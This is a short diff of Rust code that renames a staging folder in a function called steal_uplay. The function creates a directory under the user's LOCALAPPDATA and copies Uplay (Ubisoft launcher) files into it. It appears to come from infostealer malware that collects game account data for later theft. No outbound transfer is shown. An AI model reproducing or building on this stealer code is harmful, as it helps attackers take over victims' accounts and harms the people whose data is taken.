@@ -12,7 +12,7 @@ pub fn steal_uplay() {
     }
 
     std::fs::create_dir(format!(
-        "{}\\logsxc\\uplay\\",
+        "{}\\logscx\\uplay\\",
         std::env::var("LOCALAPPDATA").unwrap()
     ))
     .unwrap();
@@ -26,7 +26,7 @@ pub fn steal_uplay() {
             let _ = std::fs::copy(
                 entry.path(),
                 &format!(
-                    "{}\\logsxc\\uplay\\{}",
+                    "{}\\logscx\\uplay\\{}",
                     &std::env::var("LOCALAPPDATA").unwrap(),
                     entry.file_name().to_str().unwrap()
                 ),
